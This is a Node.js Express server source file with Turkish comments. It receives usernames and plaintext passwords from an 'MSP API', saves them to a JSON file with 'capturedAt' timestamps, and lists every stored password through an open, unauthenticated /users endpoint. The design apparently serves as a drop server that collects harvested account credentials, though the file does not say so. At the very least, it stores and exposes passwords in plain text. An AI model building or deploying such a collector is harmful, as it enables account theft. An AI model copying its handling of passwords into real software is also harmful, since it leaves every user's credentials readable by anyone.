const express = require('express');
const fs = require('fs');
const cors = require('cors');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

const USERS_FILE_PATH = path.join(__dirname, 'users.json');
const USER_EXPIRATION_HOURS = 3.5;

let writeQueue = Promise.resolve(); // ✅ Dosya işlemlerini sıraya almak için

function cleanExpiredUsers(data) {
  const now = new Date();
  const validUsers = data.users.filter(entry => new Date(entry.expiresAt) > now);
  return {
    count: validUsers.length,
    users: validUsers
  };
}

// 📥 MSP API'den gelen kullanıcı bilgilerini kaydet
app.post('/save-user', (req, res) => {
  const { username, password } = req.body;
  
  if (!username || !password) {
    return res.status(400).json({ error: 'Username and password required' });
  }

  console.log('📥 Gelen kullanıcı bilgileri:', { username, password: '***' });

  // 📌 Tüm işlemi sıraya al
  writeQueue = writeQueue.then(() => {
    return new Promise(resolve => {
      fs.readFile(USERS_FILE_PATH, 'utf8', (err, data) => {
        let userData = { count: 0, users: [] };

        if (!err && data) {
          try {
            userData = JSON.parse(data);
          } catch (e) {
            console.error('⚠️ JSON parse error:', e.message);

            const safeStart = data.indexOf('{');
            const safeEnd = data.lastIndexOf('}');
            if (safeStart !== -1 && safeEnd !== -1) {
              try {
                const fixed = data.slice(safeStart, safeEnd + 1);
                userData = JSON.parse(fixed);

                // Yedeğe al
                const backupPath = path.join(__dirname, `users_backup_${Date.now()}.json`);
                fs.writeFileSync(backupPath, data, 'utf8');
                console.warn(`🛡️ Bozuk dosya yedeklendi: ${backupPath}`);
              } catch (_) {
                console.warn('❌ Hâlâ kurtarılamadı. Boş JSON ile devam.');
              }
            }
          }
        }

        userData = cleanExpiredUsers(userData);

        const exists = userData.users.find(user => user.username === username);
        if (exists) {
          res.json({ message: 'User already exists' });
          return resolve(); // sırayı ilerlet
        }

        const now = new Date();
        const expires = new Date(now.getTime() + USER_EXPIRATION_HOURS * 60 * 60 * 1000);

        userData.users.push({
          username,
          password,
          capturedAt: now.toISOString(),
          expiresAt: expires.toISOString()
        });

        userData.count = userData.users.length;

        fs.writeFile(USERS_FILE_PATH, JSON.stringify(userData, null, 2), err => {
          if (err) {
            console.error('❌ Write error:', err);
            res.status(500).json({ error: 'Failed to save user data' });
          } else {
            console.log('✅ User saved:', username);
            res.json({ message: 'User saved successfully' });
          }
          resolve(); // sırayı ilerlet
        });
      });
    });
  }).catch(e => {
    console.error('🔁 Queue error:', e);
    res.status(500).json({ error: 'Internal error' });
  });
});

// 📤 Kullanıcıları listele
app.get('/users', (req, res) => {
  fs.readFile(USERS_FILE_PATH, 'utf8', (err, data) => {
    if (err) return res.status(500).json({ error: 'Failed to read users' });

    try {
      let userData = JSON.parse(data);
      userData = cleanExpiredUsers(userData);
      res.json(userData);
    } catch (e) {
      res.status(500).json({ error: 'Invalid users file' });
    }
  });
});
